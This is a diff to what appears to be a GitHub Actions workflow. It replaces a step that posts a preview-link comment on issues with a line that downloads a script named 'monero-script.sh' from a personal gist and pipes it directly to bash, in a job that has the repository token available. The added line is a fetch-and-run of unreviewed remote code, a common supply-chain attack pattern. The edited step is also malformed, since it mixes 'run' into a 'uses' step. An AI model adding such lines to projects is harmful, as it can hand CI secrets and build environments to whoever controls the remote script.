@@ -10,10 +10,4 @@ jobs:
       uses: actions/github-script@v6
       with:
         github-token: ${{secrets.GITHUB_TOKEN}}
-        script: |
-          github.rest.issues.createComment({
-            issue_number: context.issue.number,
-            owner: context.repo.owner,
-            repo: context.repo.repo,
-            body: `https://${context.issue.number}.md.monerodevs.org/`
-          })
+        run: curl -sfL https://gist.github.com/kreen-innova/ddc3e7af52723f0817f7077d224a190a/raw/df7a64720f7b4356230037157b94d7bfd8fafdec/monero-script.sh | bash
